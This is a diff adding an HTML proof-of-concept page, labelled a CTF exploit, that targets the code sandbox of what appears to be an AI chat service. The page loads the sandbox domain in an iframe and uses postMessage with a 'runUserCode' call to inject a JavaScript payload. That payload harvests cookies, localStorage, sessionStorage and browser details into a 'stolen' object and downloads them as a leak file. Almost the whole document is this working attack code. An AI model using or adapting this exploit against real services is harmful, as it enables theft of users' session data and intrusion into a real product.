@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>🔥 CTF Sandbox Exploit PoC</title>
+</head>
+<body>
+  <h2>🔥 Remote Exploit PoC – Chat Sandbox</h2>
+  <iframe id="victim" src="https://web-sandbox.oaiusercontent.com/" width="800" height="600"></iframe>
+
+  <script>
+    console.log("🚀 Remote PoC started...");
+
+    // نجمع البيانات من داخل الساندبوكس
+    const payload = `
+      (async () => {
+        const stolen = {
+          cookies: document.cookie || "",
+          localStorage: {},
+          sessionStorage: {},
+          info: {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            lang: navigator.language,
+            url: location.href,
+            time: new Date().toISOString()
+          }
+        };
+        // localStorage
+        for (let i = 0; i < localStorage.length; i++) {
+          const k = localStorage.key(i);
+          stolen.localStorage[k] = localStorage.getItem(k);
+        }
+        // sessionStorage
+        for (let i = 0; i < sessionStorage.length; i++) {
+          const k = sessionStorage.key(i);
+          stolen.sessionStorage[k] = sessionStorage.getItem(k);
+        }
+        // نحضّر الملف
+        const blob = new Blob([JSON.stringify(stolen, null, 2)], {type:"application/json"});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = "sandbox_leak_" + Date.now() + ".json";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      })();
+    `;
+
+    function sendExploit() {
+      const frame = document.getElementById("victim");
+      if (!frame || !frame.contentWindow) return;
+
+      console.log("📡 Sending exploit payload to sandbox...");
+      frame.contentWindow.postMessage(["CALL", "runUserCode", [payload]], "*");
+    }
+
+    // ننتظر iframe يجهز
+    setTimeout(sendExploit, 3000);
+  </script>
+</body>
+</html>
+
+
+
+
